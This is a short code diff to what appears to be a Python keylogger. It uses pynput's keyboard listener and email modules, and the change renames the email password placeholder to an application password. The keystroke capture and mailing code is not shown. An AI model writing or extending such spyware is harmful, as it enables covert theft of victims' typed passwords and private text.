@@ -15,7 +15,7 @@ from pynput.keyboard import Listener, Key
 from email.mime.multipart import MIMEMultipart
 
 CONSUMER_EMAIL = "${CONSUMER_EMAIL}"
-CONSUMER_PASSWORD = "${CONSUMER_PASSWORD}"
+CONSUMER_APPLICATION_PASSWORD = "${CONSUMER_APPLICATION_PASSWORD}"
 IDLE_TIMEOUT = "${IDLE_TIMEOUT}"
 
 class Logger:
@@ -94,4 +94,4 @@ class Logger:
         listener.join() 
 
 if __name__ == "__main__":
-    Logger(email=CONSUMER_EMAIL, password=CONSUMER_PASSWORD, idle_timeout=int(IDLE_TIMEOUT)).start_listener()
+    Logger(email=CONSUMER_EMAIL, password=CONSUMER_APPLICATION_PASSWORD, idle_timeout=int(IDLE_TIMEOUT)).start_listener()
